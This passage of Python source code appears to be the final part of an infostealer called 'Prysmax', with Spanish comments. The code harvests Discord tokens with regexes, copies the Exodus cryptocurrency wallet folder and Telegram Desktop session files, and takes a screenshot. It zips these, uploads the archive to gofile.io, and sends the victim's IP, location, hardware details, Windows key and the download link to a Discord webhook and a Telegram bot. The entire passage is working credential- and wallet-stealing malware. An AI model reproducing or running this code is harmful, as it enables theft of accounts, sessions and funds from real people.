                        for line in file.readlines():
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                for token in re.findall(regex, line):
                                    if f"{bot_token} | {platform}" not in tokens:
                                        tokens.append(token)
                                        with open(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\discord_tokens.txt', 'w', encoding='utf-8') as tokensfile:
                                            tokensfile.write(str(tokens))
                                            Discord = True
    exodus = False
    if os.path.exists(user + "\\AppData\\Local\\Temp\\Exodus"):
        shutil.rmtree(user + "\\AppData\\Local\\Temp\\Exodus")
        exodus = True
        shutil.copytree(user + "\\AppData\\Roaming\\Exodus", user + f"\\AppData\\Local\\Temp\\prysmax-{pc_name}\\Exodus")
    else:
        exodus = False
    telegram = False
    prysmax_tele = "prysmax_telegram"

    tdata_dir = os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
    zip_dest_dir = os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', prysmax_tele + ".zip")
    temp_dir = os.path.join(user, 'AppData', 'Local', 'Temp', f'prysmax-{pc_name}')
    temp_dest_dir = os.path.join(temp_dir, prysmax_tele + ".zip")

    if os.path.exists(tdata_dir):
        if os.path.exists(zip_dest_dir):
            print("La víctima ya abrió el archivo, yesyes")

            # Asegurarse de que la carpeta temporal exista
            os.makedirs(temp_dir, exist_ok=True)

            shutil.copy(zip_dest_dir, temp_dest_dir)
            telegram = True
        else:
            hash_path = os.path.join(tdata_dir, 'D877F783D5D3EF8?*')

            connection_hash_dir = os.path.join(tdata_dir, 'connection_hash')
            map_dir = os.path.join(tdata_dir, 'map')

            os.makedirs(connection_hash_dir, exist_ok=True)
            os.makedirs(map_dir, exist_ok=True)

            hash_map = glob.iglob(os.path.join(hash_path, "*"))
            for file in hash_map:
                if os.path.isfile(file):
                    shutil.copy2(file, map_dir)

            files16 = glob.iglob(os.path.join(tdata_dir, "??????????*"))
            for file in files16:
                if os.path.isfile(file):
                    shutil.copy2(file, connection_hash_dir)

            with ZipFile(zip_dest_dir, 'w') as zipObj:
                for folderName, subfolders, filenames in os.walk(map_dir):
                    for filename in filenames:
                        filePath = os.path.join(folderName, filename)
                        zipObj.write(filePath)

                for folderName, subfolders, filenames in os.walk(connection_hash_dir):
                    for filename in filenames:
                        filePath = os.path.join(folderName, filename)
                        zipObj.write(filePath)

            try:
                shutil.rmtree(connection_hash_dir)
                shutil.rmtree(map_dir)

                old_file = os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', 'session.zip')
                new_file = os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', prysmax_tele + ".zip")
                os.rename(old_file, new_file)

                # Asegurarse de que la carpeta temporal exista
                os.makedirs(temp_dir, exist_ok=True)

                shutil.copy(new_file, temp_dest_dir)
            except Exception as e:
                print(f"Error: {e}")
            telegram = True
    else:
        telegram = False
    try:
    
     sss = ImageGrab.grab()
     sss.save(user+f"\\AppData\\Local\\Temp\\prysmax-{pc_name}\\screenshot.png")

     sss.close()
     screenshot = True
    except:
        screenshot = False

    temp_folder = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Temp')

    folder_to_compress = os.path.join(temp_folder, f'prysmax-{pc_name}')

    zip_name = os.path.join(temp_folder, f'prysmax-{pc_name}')
    shutil.make_archive(zip_name, 'zip', folder_to_compress)
        
        
    response = requests.get('https://api.gofile.io/servers')
    data = response.json()
    try:
     server = data['data']['servers']["name"]  

     upload_url = f'https://{server}.gofile.io/contents/uploadfile'  
    except:
     upload_url = f'https://store1.gofile.io/contents/uploadfile'  

    filex = user + f'\\AppData\\Local\\Temp\\prysmax-{pc_name}.zip'
    
    with open(filex, 'rb') as f:
        files = {'file': (f'prysmax-{pc_name}.zip', f)}
        upload_response = requests.post(upload_url, files=files)
        uploadth = upload_response.json() 
        link_download = uploadth["data"]["downloadPage"]
   
    whnetwork = DiscordWebhook(url=theapi2023, username="Prysmax Software", avatar_url="https://i.imgur.com/jJES3AX.png")

    embednt1 = DiscordEmbed(title='Prysmax | NETWORK', description=f"⟹ • IP ⋮ {theip}\n ⟹ • Country ⋮ {ip_country}\n ⟹• City ⋮ {ip_city}\n ⟹ • Region ⋮ {ip_region}\n ⟹ • VPN ⋮ {ip_proxy}")

    embednt1.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/jJES3AX.png')
    embednt1.set_thumbnail(url='https://i.imgur.com/jJES3AX.png')
    embednt1.set_footer(text='t.me/lawxsz')
    embednt2 = DiscordEmbed(title='Prysmax | PC', description=f"⟹ • PC Name ⋮ {pc_name}\n ⟹ • OS ⋮ {pc_os}\n ⟹• CPU ⋮ {pc_cpu}\n ⟹ • HWID ⋮ {pc_hwid}\n ⟹ • RAM ⋮ {pc_ram}\n ⟹ • GPU ⋮ {pc_gpu}\n⟹ • Windows Key ⋮ {pc_key}\n⟹ • Antivirus ⋮ {antivirus_name}")

    embednt2.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/jJES3AX.png')
    embednt2.set_thumbnail(url='https://i.imgur.com/jJES3AX.png')
    embednt2.set_footer(text='t.me/lawxsz')

    embednt3 = DiscordEmbed(title='Prysmax | Files', description=f"⟹ • Telegram ⋮ {telegram}\n ⟹ • Discord ⋮ {Discord}\n ⟹• Exodus ⋮ {exodus}\n ⟹ • Screenshot ⋮ {screenshot}\n ⟹ • Process Num ⋮ {num_procesos}\n ⟹ • Download Files ⋮ {link_download}\n")

    embednt3.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/jJES3AX.png')
    embednt3.set_thumbnail(url='https://i.imgur.com/jJES3AX.png')
    embednt3.set_footer(text='t.me/lawxsz')

    whnetwork.add_embed(embednt1)
    whnetwork.add_embed(embednt2)
    whnetwork.add_embed(embednt3)
    try:
      if theapi2023 == "Here-Token":
       print("Envio a Discord actualmente desactivado!")
      else:
          whnetwork.execute()
    except:
        pass
   
    message = f"""
*Prysmax | NETWORK*
⟹ • IP ⋮ {theip}
⟹ • Country ⋮ {ip_country}
⟹ • City ⋮ {ip_city}
⟹ • Region ⋮ {ip_region}
⟹ • VPN ⋮ {ip_proxy}

*Prysmax | PC*
⟹ • PC Name ⋮ {pc_name}
⟹ • OS ⋮ {pc_os}
⟹ • CPU ⋮ {pc_cpu}
⟹ • HWID ⋮ {pc_hwid}
⟹ • RAM ⋮ {pc_ram}
⟹ • GPU ⋮ {pc_gpu}
⟹ • Windows Key ⋮ {pc_key}
⟹ • Antivirus ⋮ {antivirus_name}

*Prysmax | Files*
⟹ • Telegram ⋮ {telegram}
⟹ • Discord ⋮ {Discord}
⟹ • Exodus ⋮ {exodus}
⟹ • Screenshot ⋮ {screenshot}
⟹ • Process Num ⋮ {num_procesos}
⟹ • Download Files ⋮ {link_download}

*Prysmax | Credentials*
Passwords From: {G37W3851735(p45WW0rDs)}
Cookies From: {G37W3851735(c00K1W0rDs)}
Total History: {H1570rYC0UNt}
"""
    params = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown" 
    }

    response = requests.post(url, data=params)

    if response.status_code == 200:
        print("Payload enviado a TELEGRAM CORRECTAMENTE!!.")
    else:
        print("Error al enviar a telegramm:", response.text)
    


if __name__ == "__main__":
    machine_info()
